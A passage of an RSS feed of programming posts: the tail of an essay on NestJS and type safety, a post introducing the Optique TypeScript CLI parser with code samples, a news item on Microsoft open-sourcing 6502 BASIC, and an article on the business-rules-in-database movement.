&ndash; Choose tools that make problems easier to find and fix</li> <li><strong>What&rsquo;s the team knowledge cost?</strong> &ndash; Factor learning curves into architectural decisions</li> </ol><p>The trap we fell into was choosing based on aspirational complexity rather than current reality. We imagined we&rsquo;d eventually need enterprise patterns, so we adopted them early. But architectural decisions should serve today&rsquo;s problems while enabling tomorrow&rsquo;s growth, not create today&rsquo;s problems for tomorrow&rsquo;s hypothetical benefits.</p><h2>The Real Lesson About Type Safety</h2><p>The 72-hour debugging nightmare wasn&rsquo;t caused by bad code or poor practices, it was caused by choosing tools that systematically bypass the safety mechanisms we depend on. TypeScript&rsquo;s promise of &ldquo;JavaScript with safety&rdquo; breaks down when frameworks require you to abandon type checking in critical areas.</p><p>Dependency injection&rsquo;s promise of &ldquo;flexible, testable code&rdquo; breaks down when the flexibility enables errors that strict typing would prevent. The ceremony of enterprise patterns doesn&rsquo;t compensate for the loss of compile-time verification.</p><p>For backend development, where correctness is paramount and debugging failures are expensive, tools that make errors impossible to compile often serve you better than tools that make correct usage easier to express.</p><p>The choice between safety and sophistication should be deliberate and aligned with actual requirements. Runtime flexibility isn&rsquo;t worth much if your runtime doesn&rsquo;t work reliably.</p><h2>Choose Your Guarantees Carefully</h2><p>The lesson isn&rsquo;t that sophisticated frameworks are universally bad, it&rsquo;s that the choice between flexibility and correctness has real consequences for development velocity, debugging complexity, and system reliability.</p><p>After this experience, I&rsquo;m convinced that for most backend services, the guarantees provided by strict typing and explicit dependencies matter more than the expressiveness provided by sophisticated frameworks. The cognitive overhead of understanding framework mechanics often exceeds the benefit of framework features.</p><p>This doesn&rsquo;t make NestJS a bad framework. For teams actually dealing with large-scale coordination problems, complex business domains, and established development processes, its structured approach provides real value. The framework works well when your problems match its strengths.</p><p>But for teams building straightforward services, the framework&rsquo;s complexity tax, in debugging time, test maintenance, and knowledge requirements, often exceeds its benefits. Starting simple and adding complexity as problems actually emerge is usually more sustainable than adopting complex patterns preventively.</p><p>The next time we evaluate frameworks, I&rsquo;ll ask different questions: &ldquo;What problems do we actually have today?&rdquo; rather than &ldquo;What problems might we have someday?&rdquo; and &ldquo;Can we solve this more simply?&rdquo; rather than &ldquo;What&rsquo;s the most sophisticated solution?&rdquo;</p><p>Choose your complexity deliberately. Choose your type safety carefully. Your future debugging self will thank you for the honesty.</p><hr><p><em><em>This post is based on real refactoring experiences with enterprise Node.js applications. While specific APIs and business logic are anonymized, the complexity patterns, time investments, and debugging challenges reflect authentic developer experience I faced during the implementation.</em></em></p></div></section>]]></description><pubDate>Sun, 07 Sep 2025 00:48:57 +0530</pubDate></item><item><link>https://hackers.pub/@hongminhee/2025/stop-writing-cli-validation-parse-it-right-the-first-time</link><title>Stop writing CLI validation. Parse it right the first time. (hackers.pub)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na6pes/stop_writing_cli_validation_parse_it_right_the/</guid><comments>https://www.reddit.com/r/programming/comments/1na6pes/stop_writing_cli_validation_parse_it_right_the/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 16 min | <a href='https://www.reddit.com/r/programming/comments/1na6pes/stop_writing_cli_validation_parse_it_right_the/'>Post permalink</a></p></section><section class='preview-image'><img src='https://hackers.pub/@hongminhee/2025/stop-writing-cli-validation-parse-it-right-the-first-time/ogimage?l=en' /></section><section class='parsed-content'><div><p>I have this bad habit. When something annoys me enough times, I end up building a library for it. This time, it was CLI validation code.</p><p>See, I spend a lot of time reading other people's code. Open source projects, work stuff, random GitHub repos I stumble upon at 2 AM. And I kept noticing this thing: every CLI tool has the same ugly validation code tucked away somewhere. You know the kind:</p><pre><code><span><span>if</span><span> (</span><span>!</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> throw</span><span> new</span><span> Error</span><span>(</span><span>"</span><span>--port requires --server flag</span><span>"</span><span>);</span></span> <span><span>}</span></span> <span><span>if</span><span> (</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> !</span><span>opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> opts</span><span>.</span><span>port</span><span> =</span><span> 3000</span><span>;</span><span> // default port</span></span> <span><span>}</span></span> <span><span>// wait, what if they pass --port without a value?</span></span> <span><span>// what if the port is out of range?</span></span> <span><span>// what if...</span></span></code></pre><p>It's not even that this code is hard to write. It's that it's <em>everywhere</em>. Every project. Every CLI tool. The same patterns, slightly different flavors. Options that depend on other options. Flags that can't be used together. Arguments that only make sense in certain modes.</p><p>And here's what really got me: we solved this problem years ago for other types of data. Just&hellip; not for CLIs.</p><h2>The problem with validation <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--the-problem-with-validation"></a></h2><p>There's this blog post that completely changed how I think about parsing. It's called <a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/"><em>Parse, don't validate</em></a> by Alexis King. The gist? Don't parse data into a loose type and then check if it's valid. Parse it directly into a type that can only be valid.</p><p>Think about it. When you get JSON from an API, you don't just parse it as <code>any</code> and then write a bunch of <code>if</code>-statements. You use something like <a href="https://zod.dev/">Zod</a> to parse it directly into the shape you want. Invalid data? The parser rejects it. Done.</p><p>But with CLIs? We parse arguments into some bag of properties and then spend the next 100 lines checking if that bag makes sense. It's backwards.</p><p>So yeah, I built <a href="https://optique.dev/">Optique</a>. Not because the world desperately needed another CLI parser (it didn't), but because I was tired of seeing&mdash;and writing&mdash;the same validation code everywhere.</p><h2>Three patterns I was sick of validating <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--three-patterns-i-was-sick-of-validating"></a></h2> <h3>Dependent options <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--dependent-options"></a></h3><p>This one's everywhere. You have an option that only makes sense when another option is enabled.</p><p>The old way? Parse everything, then check:</p><pre><code><span><span>const </span><span>opts</span><span> =</span><span> parseArgs</span><span>(</span><span>process</span><span>.</span><span>argv</span><span>);</span></span> <span><span>if</span><span> (</span><span>!</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> throw</span><span> new</span><span> Error</span><span>(</span><span>"</span><span>--port requires --server</span><span>"</span><span>);</span></span> <span><span>}</span></span> <span><span>if</span><span> (</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> !</span><span>opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> opts</span><span>.</span><span>port</span><span> =</span><span> 3000</span><span>;</span></span> <span><span>}</span></span> <span><span>// More validation probably lurking elsewhere...</span></span></code></pre><p>With Optique, you just describe what you want:</p><pre><code><span><span>const </span><span>config</span><span> =</span><span> withDefault</span><span>(</span></span> <span><span> object</span><span>({</span></span> <span><span> server</span><span>: </span><span>flag</span><span>(</span><span>"</span><span>--server</span><span>"</span><span>),</span></span> <span><span> port</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--port</span><span>"</span><span>, </span><span>integer</span><span>()),</span></span> <span><span> workers</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--workers</span><span>"</span><span>, </span><span>integer</span><span>())</span></span> <span><span> }),</span></span> <span><span> { </span><span>server</span><span>: </span><span>false</span><span> }</span></span> <span><span>);</span></span></code></pre><p>Here's what TypeScript infers for <code>config</code>'s type:</p><pre><code><span><span>type</span><span> Config</span><span> =</span></span> <span><span> |</span><span> {</span><span> readonly</span><span> server</span><span>: </span><span>false</span><span> }</span></span> <span><span> |</span><span> {</span><span> readonly</span><span> server</span><span>: </span><span>true</span><span>;</span><span> readonly</span><span> port</span><span>: </span><span>number</span><span>;</span><span> readonly</span><span> workers</span><span>: </span><span>number</span><span> }</span></span></code></pre><p>The type system now understands that when <code>server</code> is false, <code>port</code> literally doesn't exist. Not <code>undefined</code>, not <code>null</code>&mdash;it's not there. Try to access it and TypeScript yells at you. No runtime validation needed.</p><h3>Mutually exclusive options <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--mutually-exclusive-options"></a></h3><p>Another classic. Pick one output format: JSON, YAML, or XML. But definitely not two.</p><p>I used to write this mess:</p><pre><code><span><span>if</span><span> ((</span><span>opts</span><span>.</span><span>json</span><span> ?</span><span> 1</span><span> :</span><span>)</span><span> +</span><span> (</span><span>opts</span><span>.</span><span>yaml</span><span> ?</span><span> 1</span><span> :</span><span>)</span><span> +</span><span> (</span><span>opts</span><span>.</span><span>xml</span><span> ?</span><span> 1</span><span> :</span><span>)</span><span> &gt;</span><span> 1</span><span>)</span><span> {</span></span> <span><span> throw</span><span> new</span><span> Error</span><span>(</span><span>'</span><span>Choose only one output format</span><span>'</span><span>);</span></span> <span><span>}</span></span></code></pre><p>(Don't judge me, you've written something similar.)</p><p>Now?</p><pre><code><span><span>const </span><span>format</span><span> =</span><span> or</span><span>(</span></span> <span><span> map</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--json</span><span>"</span><span>),</span><span> ()</span><span> =&gt;</span><span> "</span><span>json</span><span>"</span><span> as</span><span> const</span><span>),</span></span> <span><span> map</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--yaml</span><span>"</span><span>),</span><span> ()</span><span> =&gt;</span><span> "</span><span>yaml</span><span>"</span><span> as</span><span> const</span><span>),</span></span> <span><span> map</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--xml</span><span>"</span><span>),</span><span> ()</span><span> =&gt;</span><span> "</span><span>xml</span><span>"</span><span> as</span><span> const</span><span>)</span></span> <span><span>);</span></span></code></pre><p>The <code>or()</code> combinator means exactly one succeeds. The result is just <code>"json" | "yaml" | "xml"</code>. A single string. Not three booleans to juggle.</p><h3>Environment-specific requirements <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--environment-specific-requirements"></a></h3><p>Production needs auth. Development needs debug flags. Docker needs different options than local. You know the drill.</p><p>Instead of a validation maze, you just describe each environment:</p><pre><code><span><span>const </span><span>envConfig</span><span> =</span><span> or</span><span>(</span></span> <span><span> object</span><span>({</span></span> <span><span> env</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>prod</span><span>"</span><span>),</span></span> <span><span> auth</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--auth</span><span>"</span><span>, </span><span>string</span><span>()), </span><span>// Required in prod</span></span> <span><span> ssl</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--ssl</span><span>"</span><span>),</span></span> <span><span> monitoring</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--monitoring</span><span>"</span><span>, </span><span>url</span><span>())</span></span> <span><span> }),</span></span> <span><span> object</span><span>({</span></span> <span><span> env</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>dev</span><span>"</span><span>),</span></span> <span><span> debug</span><span>: </span><span>optional</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--debug</span><span>"</span><span>)), </span><span>// Optional in dev</span></span> <span><span> verbose</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--verbose</span><span>"</span><span>)</span></span> <span><span> })</span></span> <span><span>);</span></span></code></pre><p>No auth in production? Parser fails immediately. Trying to access <code>--auth</code> in dev mode? TypeScript won't let you&mdash;the field doesn't exist on that type.</p><h2>&ldquo;But parser combinators though&hellip;&rdquo; <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--but-parser-combinators-though"></a></h2><p>I know, I know. &ldquo;Parser combinators&rdquo; sounds like something you'd need a CS degree to understand.</p><p>Here's the thing: I don't have a CS degree. Actually, I don't have any degree. But I've been using parser combinators for years because they're actually&hellip; not that hard? It's just that the name makes them sound way scarier than they are.</p><p>I'd been using them for other stuff&mdash;parsing config files, DSLs, whatever. But somehow it never clicked that you could use them for CLI parsing until I saw Haskell's <a href="https://github.com/pcapriotti/optparse-applicative">optparse-applicative</a>. That was a real &ldquo;wait, of course&rdquo; moment. Like, why are we doing this any other way?</p><p>Turns out it's stupidly simple. A parser is just a function. Combinators are just functions that take parsers and return new parsers. That's it.</p><pre><code><span><span>// This is a parser</span></span> <span><span>const </span><span>port</span><span> =</span><span> option</span><span>(</span><span>"</span><span>--port</span><span>"</span><span>,</span><span> integer</span><span>());</span></span> <span><span>// This is also a parser (made from smaller parsers)</span></span> <span><span>const </span><span>server</span><span> =</span><span> object</span><span>({</span></span> <span><span> port</span><span>: </span><span>port</span><span>,</span></span> <span><span> host</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--host</span><span>"</span><span>, </span><span>string</span><span>())</span></span> <span><span>});</span></span> <span><span>// Still a parser (parsers all the way down)</span></span> <span><span>const </span><span>config</span><span> =</span><span> or</span><span>(</span><span>server</span><span>,</span><span> client</span><span>);</span></span></code></pre><p>No monads. No category theory. Just functions. Boring, beautiful functions.</p><h2>TypeScript does the heavy lifting <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--typescript-does-the-heavy-lifting"></a></h2><p>Here's the thing that still feels like cheating: I don't write types for my CLI configs anymore. TypeScript just&hellip; figures it out.</p><pre><code><span><span>const </span><span>cli</span><span> =</span><span> or</span><span>(</span></span> <span><span> command</span><span>(</span><span>"</span><span>deploy</span><span>"</span><span>,</span><span> object</span><span>({</span></span> <span><span> action</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>deploy</span><span>"</span><span>),</span></span> <span><span> environment</span><span>: </span><span>argument</span><span>(</span><span>string</span><span>()),</span></span> <span><span> replicas</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--replicas</span><span>"</span><span>, </span><span>integer</span><span>())</span></span> <span><span> })),</span></span> <span><span> command</span><span>(</span><span>"</span><span>rollback</span><span>"</span><span>,</span><span> object</span><span>({</span></span> <span><span> action</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>rollback</span><span>"</span><span>),</span></span> <span><span> version</span><span>: </span><span>argument</span><span>(</span><span>string</span><span>()),</span></span> <span><span> force</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--force</span><span>"</span><span>)</span></span> <span><span> }))</span></span> <span><span>);</span></span> <span><span>// TypeScript infers this type automatically:</span></span> <span><span>type</span><span> Cli</span><span> =</span></span> <span><span> |</span><span> {</span></span> <span><span> readonly</span><span> action</span><span>: </span><span>"</span><span>deploy</span><span>"</span></span> <span><span> readonly</span><span> environment</span><span>: </span><span>string</span></span> <span><span> readonly</span><span> replicas</span><span>: </span><span>number</span></span> <span><span> }</span></span> <span><span> |</span><span> {</span></span> <span><span> readonly</span><span> action</span><span>: </span><span>"</span><span>rollback</span><span>"</span></span> <span><span> readonly</span><span> version</span><span>: </span><span>string</span></span> <span><span> readonly</span><span> force</span><span>: </span><span>boolean</span></span> <span><span> }</span></span></code></pre><p>TypeScript knows that if <code>action</code> is <code>"deploy"</code>, then <code>environment</code> exists but <code>version</code> doesn't. It knows <code>replicas</code> is a <code>number</code>. It knows <code>force</code> is a <code>boolean</code>. I didn't tell it any of this.</p><p>This isn't just about nice autocomplete (though yeah, the autocomplete is great). It's about catching bugs before they happen. Forget to handle a new option somewhere? Code won't compile.</p><h2>What actually changed for me <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--what-actually-changed-for-me"></a></h2><p>I've been dogfooding this for a few weeks. Some real talk:</p><p><strong>I delete code now.</strong> Not refactor. Delete. That validation logic that used to be 30% of my CLI code? Gone. It feels weird every time.</p><p><strong>Refactoring isn't scary.</strong> Want to know something that usually terrifies me? Changing how a CLI takes its arguments. Like going from <code>--input file.txt</code> to just <code>file.txt</code> as a positional argument. With traditional parsers, you're hunting down validation logic everywhere. With this? You change the parser definition, TypeScript immediately shows you every place that breaks, you fix them, done. What used to be an hour of &ldquo;did I catch everything?&rdquo; is now &ldquo;fix the red squiggles and move on.&rdquo;</p><p><strong>My CLIs got fancier.</strong> When adding complex option relationships doesn't mean writing complex validation, you just&hellip; add them. Mutually exclusive groups? Sure. Context-dependent options? Why not. The parser handles it.</p><p>The reusability is real too:</p><pre><code><span><span>const </span><span>networkOptions</span><span> =</span><span> object</span><span>({</span></span> <span><span> host</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--host</span><span>"</span><span>, </span><span>string</span><span>()),</span></span> <span><span> port</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--port</span><span>"</span><span>, </span><span>integer</span><span>())</span></span> <span><span>});</span></span> <span><span>// Reuse everywhere, compose differently</span></span> <span><span>const </span><span>devServer</span><span> =</span><span> merge</span><span>(</span><span>networkOptions</span><span>,</span><span> debugOptions</span><span>);</span></span> <span><span>const </span><span>prodServer</span><span> =</span><span> merge</span><span>(</span><span>networkOptions</span><span>,</span><span> authOptions</span><span>);</span></span> <span><span>const </span><span>testServer</span><span> =</span><span> merge</span><span>(</span><span>networkOptions</span><span>,</span><span> mockOptions</span><span>);</span></span></code></pre><p>But honestly? The biggest change is trust. If it compiles, the CLI logic works. Not &ldquo;probably works&rdquo; or &ldquo;works unless someone passes weird arguments.&rdquo; It just works.</p><h2>Should you care? <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--should-you-care"></a></h2><p>If you're writing a 10-line script that takes one argument, you don't need this. <code>process.argv[2]</code> and call it a day.</p><p>But if you've ever:</p><ul> <li>Had validation logic get out of sync with your actual options</li> <li>Discovered in production that certain option combinations explode</li> <li>Spent an afternoon tracking down why <code>--verbose</code> breaks when used with <code>--json</code></li> <li>Written the same &ldquo;option A requires option B&rdquo; check for the fifth time</li> </ul><p>Then yeah, maybe you're tired of this stuff too.</p><p>Fair warning: Optique is young. I'm still figuring things out, the API might shift a bit. But the core idea&mdash;parse, don't validate&mdash;that's solid. And I haven't written validation code in months.</p><p>Still feels weird. Good weird.</p><h2>Try it or don't <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--try-it-or-dont"></a></h2><p>If this resonates:</p><ul> <li><a href="https://optique.dev/tutorial"><em>Tutorial</em></a>: Build something real, see if you hate it</li> <li><em>Concepts</em>: <a href="https://optique.dev/concepts/primitives">Primitives</a>, <a href="https://optique.dev/concepts/constructs">constructs</a>, <a href="https://optique.dev/concepts/modifiers">modifiers</a>, <a href="https://optique.dev/concepts/valueparsers">value parsers</a>, the whole thing</li> <li><a href="https://github.com/dahlia/optique"><em>GitHub</em></a>: The code, issues, angry rants</li> </ul><p>I'm not saying Optique is the answer to all CLI problems. I'm just saying I was tired of writing the same validation code everywhere, so I built something that makes it unnecessary.</p><p>Take it or leave it. But that validation code you're about to write? You probably don't need it.</p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 23:49:10 +0530</pubDate></item><item><link>https://www.pcworld.com/article/2898698/microsofts-first-ever-programming-language-was-just-open-sourced.html</link><title>Microsoft’s first-ever programming language was just open-sourced (pcworld.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/</guid><comments>https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.pcworld.com/wp-content/uploads/2025/09/Commodore-64.jpg?quality=50&strip=all&w=1024' /></section><section class='parsed-content'><div><article><div><div><div><body><p>Did you know that, between 1976 and 1978, Microsoft developed its own version of the BASIC programming language? It was initially called Altair BASIC before becoming Microsoft BASIC, and it was designed for the 6502 (a microprocessor used in the Apple II, Atari 2600, VIC-20, Commodore 64, and Nintendo Entertainment System).</p><p>As of yesterday, Microsoft has released the version 1.1 source code of &ldquo;Microsoft BASIC for 6502 Microprocessor&rdquo; on <a href="https://go.skimresources.com?id=111346X1569483&amp;xs=1&amp;url=https://github.com/microsoft/BASIC-M6502&amp;xcust=2-1-2898698-1-0-0-0-0&amp;sref=https://www.pcworld.com/article/2898698/microsofts-first-ever-programming-language-was-just-open-sourced.html">GitHub</a>, which means you can freely view the assembly code and even download it if you want to.</p><p>Why did Microsoft publish this code? Because it has historical significance and was one of the pillars of modern software:</p><blockquote><p>This source code represents the foundation upon which the modern software industry was built. The techniques, patterns, and business models pioneered in this BASIC interpreter directly influenced:</p><ul> <li>The development of MS-DOS and subsequent Microsoft operating systems</li> <li>The standardization of programming language implementations</li> <li>The establishment of software licensing as a business model</li> <li>The democratization of computer programming</li> </ul> </blockquote><p>Microsoft&rsquo;s version of BASIC was one of the first programming languages that the general public came into contact with, making it an important milestone in computer history. While Microsoft BASIC is no longer used in earnest, its spirit lives on with Visual Basic .NET.</p></body></div><p>This article originally appeared on our sister publication <a href="https://www.pcforalla.se">PC f&ouml;r Alla</a> and was translated and localized from Swedish.</p><div><h3> <a href="https://www.pcworld.com/author/mikael_markander"> Author: Mikael Markander</a>, Contributor, PCWorld </h3><div><p>Mikael writes news across all our consumer tech categories. He has previously worked with Macworld, but today mainly writes for our sister sites PC f&ouml;r Alla and M3. Mikael has a firm grasp on which gadgets are released, and what is happening with the streaming services and the latest AI tools.</p></div></div></div></div></article> </div><div class="gallery"><p><img src="https://www.pcworld.com/wp-content/uploads/2025/09/1380047922-4.jpg?quality=50&amp;strip=all&amp;w=150&amp;h=150&amp;crop=1"></p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 20:41:56 +0530</pubDate></item><item><link>https://medium.com/@vbilopav/business-rules-in-database-movement-e0167dba19b7</link><title>Business Rules In Database Movement (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n9z7fb/business_rules_in_database_movement/</guid><comments>https://www.reddit.com/r/programming/comments/1n9z7fb/business_rules_in_database_movement/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1n9z7fb/business_rules_in_database_movement/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Did you know that there was an entire movement in software development, complete with its own manifesto, thought leaders, and everything, dedicated almost exclusively to putting business logic in SQL databases?</p><p>Neither did I.</p><p>So I did some research to create a post, and it turned out to be an entire article that digs into this movement a little bit deeper.</p><p>I hope you like it. It is important to know history.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://miro.medium.com/v2/resize:fit:650/1*lZynIQzxJtEgajCU50kQ4Q.png' /></section><section class='parsed-content'><div><figure></figure><blockquote><p><em>Those who cannot remember the past are condemned to repeat it.</em></p></blockquote><p>Did you know that there was an entire movement in software development, complete with its own manifesto, thought leaders, and everything, dedicated almost exclusively to putting business logic in SQL databases?</p><p>I certainly didn&rsquo;t. But it did happen in the late 1990s and early 2000s.</p><p>Their core philosophy was as follows:</p><p>- Data belongs to the organization, not the application. Today, we typically refer to the Bounded Context.</p><p>- Rules and constraints should be stored and enforced in the database (or a rules engine), not scattered across individual applications. Today, the Domain Model, of course. But, in essence, just don&rsquo;t repeat yourself. The database is the source of truth, and no point in having to repeat the same logic across different applications, services, and business reports.</p><p>- Rules should be declarative using natural language (not imperative or procedural) to make them easily accessible to a business non-tech audience. Today, we say the Domain Experts, but essentially, the same business people.</p><p>- We should be focused on managing business rules, not hardware/software platforms and technology. Today, we would say implementation details, but in essence, it&rsquo;s the same idea.</p><p>And so on. Does this sound familiar?</p><p>You can read the full manifesto here (PDF link): <a href="https://www.businessrulesgroup.org/brmanifesto/BRManifesto.pdf">https://www.businessrulesgroup.org/brmanifesto/BRManifesto.pdf</a></p><p>An even more fascinating story is why it fizzled out and almost completely disappeared.</p><p>According to my research, in the late 90s and early 20s, this movement was hyped, and indeed it was hyped, as confirmed by a stream of conferences, forums, workshops, and thought leaders from that era. Even the research and advisory companies like Gartner promoted the idea under the catchy motto &ldquo;change the rules, not the code&rdquo; and labeled it as &ldquo;hot&rdquo;.</p><p>And then there was a boom of startups building low-code platform tools on this idea, even industry giants like Oracle and IBM tried to incorporate some of these ideas into their own low-code, rule engines. However, the dot-com crash in the early 20s and many startups building BRMS/low-code tools died.</p><p>But much more importantly than the dot-com extinction event was a significant cultural shift in the software development world that occurred shortly thereafter:</p><h2>1) The Agile Movement</h2><p>Developers preferred flexibility and speed over centralized governance. DBAs and architects pushing data-centric models often lost out to agile, app-centric teams.</p><p>In simple terms, development teams from that era had dedicated DBAs, and a dedicated DBA is supposed to implement all those rules in the databases, close to data itself, using declarative SQL:</p><pre><span>ALTER TABLE loans ADD CONSTRAINT CHECK NOT (status = 'approved' AND credit_score &lt; 650);<br>ALTER TABLE users ADD CONSTRAINT UNIQUE(email);<br>ALTER TABLE users ALTER COLUMN email SET NOT NULL;</span></pre><p>That was not agile enough, obviously. Those rules should reside in an RDBMS or BRMS (Business Rules Management System), and you will need a specialized person for that.</p><h2>2) Vendor Lock-In</h2><p>Obviously, such centralization meant locking into proprietary platforms, which usually meant paying large tech companies a significant amount of money for an extended period, as free and open-source alternatives weren&rsquo;t yet viable solutions.</p><h2>3) Perceived Complexity and Technical Limitations</h2><p>A single, centralized solution is perceived as more complex than a decentralized one, which tends to be repetitive and scattered across various services.</p><p>Furthermore, some of the emerging development practices accepted as standard today, such as source control and automated testing, weren&rsquo;t exactly a priority for this new, centralized RDBMS and BRMS world managed by DBAs.</p><p>So what happened then?</p><h2>The Evolution</h2><p>The entire software development process started evolving in a different direction, one that is supposed to give more power to the individual programmer and take it away from those DBAs. Arguably, it was successful since dedicated DBAs have become a rare breed these days, at least from my perspective.</p><p>First, in the 2000s, after the dot-com crash, there was an emergence of alternative philosophies.</p><ul><li>First around in 2003 and onward, Eric Evans&rsquo; Blue Book and DDD.</li><li>And thereafter, in the 2010s and onward, Robert C. Martin and Clean Architecture.</li></ul><p>Both of these philosophies, which are now widely accepted, argue that business rules don&rsquo;t belong to a centralized data and business rules engines like RDBMS and similar &mdash; but rather to the domain model or the architecture core, respectively.</p><p>They argue that RDBMS and similar systems are and should be concerned only with storing and retrieving data, and the decision engine should be moved back to the application.</p><p>This meant reintroducing business rules back into the application layer, as the industry shifted toward 3-tier architectures with business logic in the middle tier, rather than in the database.</p><p>But this also meant that those same rules will inevitably have to be repeated across various applications, services, and reports, which is, of course, suboptimal, to say the least. To address this issue, we saw:</p><ul><li>First, the emergence of Service-Oriented Architecture or SOA in the mid-2000s. The idea was to centralize logic in services where programmers have control.</li><li>And then the emergence of Microservices in the 2010s and onward, with rules scattered across many different specialized services.</li></ul><h2>Where Are We Today</h2><p>Today, RDMBS are here to stay, and any component developer (at least the backend developer) should also be a DBA.</p><p>After 20+ years, perhaps it is time to revisit some of the arguments that led the industry to reject the Business Rules Movement in the late 90s and early 2000s.</p><h2>Vendor Lock In:</h2><p>PostgreSQL is free, open-source, portable, and has a massive ecosystem of support. You&rsquo;re no longer tied to Oracle licenses just to run stored procedures or triggers.</p><h2>Switching Scaling Issues</h2><p>DDD/CA proponents see relying on a database as dangerous: switching DBs or scaling across multiple persistence stores becomes nearly impossible. Scaling relational databases horizontally was <em>hard</em> and proprietary.</p><p>But today, there are also numerous distributed and extremely scalable Postgres-compatible free and open source variants as well, such as Citus, Timescale, etc. Scaling isn&rsquo;t much of a killer anymore. It is challenging, but then again, scaling will always be a challenge.</p><p>And with PostgreSQL and its variants, which offer advanced polyglot capabilities covering well over 90 percent of needs, is there still a need to switch? Portability is much less relevant today.</p><h2>Separation of Concenrs</h2><p>This was a misunderstanding from the beginning; SQL rules are domain semantics, and SQL is not storage code by any means. Postgres doesn&rsquo;t care <em>where</em> it runs; it enforces rules consistently.</p><h2>Testing &amp; Tooling</h2><p>Today, testing DB rules is very straightforward using rollbac-tests, migrations in containers, fixtures, and tools like pgTAP.</p><p>It is a weak spot compared to modern app languages with powerful IDEs, refactoring capabilities, and type systems, but it is very much doable and manageable.</p><p>The real gap is developer culture: fewer devs are fluent in SQL as a <em>primary modeling language</em>.</p><h2>Big Picture</h2><p>The database-centric philosophy is much more defensible in 2025 than it was in 2005. RDMBS and SQL are here to stay, and they are evolving and getting better.</p><p>The main &ldquo;barrier&rdquo; now is cultural: developers are trained to think in code-first terms, not data-first.</p><p>However, we do live in 2025, not in 2005.</p></div><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*bNH44cmtwewRk1TJ8kPLAw.jpeg"></p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 18:41:54 +0530</pubDate></item></channel></rss>
